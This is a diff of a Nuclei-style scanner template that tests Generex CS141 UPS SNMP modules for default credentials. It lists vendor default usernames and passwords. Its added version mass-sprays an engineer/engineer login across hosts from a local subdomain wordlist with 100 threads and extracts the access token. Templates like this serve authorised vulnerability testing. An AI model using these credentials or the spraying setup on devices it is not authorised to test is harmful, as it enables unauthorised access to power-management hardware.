@@ -1,66 +1,40 @@
-id: cs141-default-login
-
+id: cs141-default-login 2
 info:
-  name: UPS Adapter CS141 SNMP Module Default Login
   author: socketz
+  name: CS141 SNMP Module Default Credentials
+  reference: https://www.generex.de/media/pages/packages/documents/manuals/f65348d5b6-1628841637/manual_CS141_en.pdf
   severity: medium
-  description: UPS Adapter CS141 SNMP Module default login credentials were discovered.
-  reference:
-    - https://www.generex.de/media/pages/packages/documents/manuals/f65348d5b6-1628841637/manual_CS141_en.pdf
-  classification:
-    cwe-id: CWE-798
-    cpe: cpe:2.3:h:generex:cs141:*:*:*:*:*:*:*:*
-  metadata:
-    max-request: 3
-    shodan-query: http.html:"CS141"
-    product: cs141
-    vendor: generex
-  tags: hiawatha,iot,default-login,vuln
+  tags: hiawatha,iot,default-login
+requests:
+- attack: sniper
+  extractors:
+  - kval:
+    - accessToken
+    type: kval
+  matchers:
+  - condition: and
+    part: header
+    type: word
+    words:
+    - accessToken
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'POST /api/login HTTP/1.1
 
-http:
-  - raw:
-      - |
-        POST /api/login HTTP/1.1
-        Host: {{Hostname}}
-        Accept: application/json, text/plain, */*
-        Content-Type: application/json
+    Host: {{Subdomains}}
 
-        {"userName":"{{user}}","password":"{{pass}}"}
+    Accept: application/json, text/plain, */*
 
-    attack: pitchfork
-    payloads:
-      user:
-        - admin
-        - engineer
-        - guest
-      pass:
-        - cs141-snmp
-        - engineer
-        - guest
-    stop-at-first-match: true
+    Content-Type: application/json
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - 'accessToken'
-          - 'application/json'
-        condition: and
-        part: header
 
-      - type: word
-        part: body
-        words:
-          - 'accessToken'
-          - 'AdminFirstTime'
-        condition: and
+    {"userName":"engineer","password":"engineer"}
 
-      - type: status
-        status:
-          - 200
-
-    extractors:
-      - type: kval
-        kval:
-          - accessToken
-# digest: 490a0046304402206d1fa562bca07ebd5f56ce4179d8e2b294f6917e7d1b23da23745a4816f76c3c022032fa4c472fbb6e463b53affd903f195ea21a8ebb4adecd4a9c96fa3d65a44630:922c64590222798bb761d5b6d8e72950
+    '
+  threads: 100
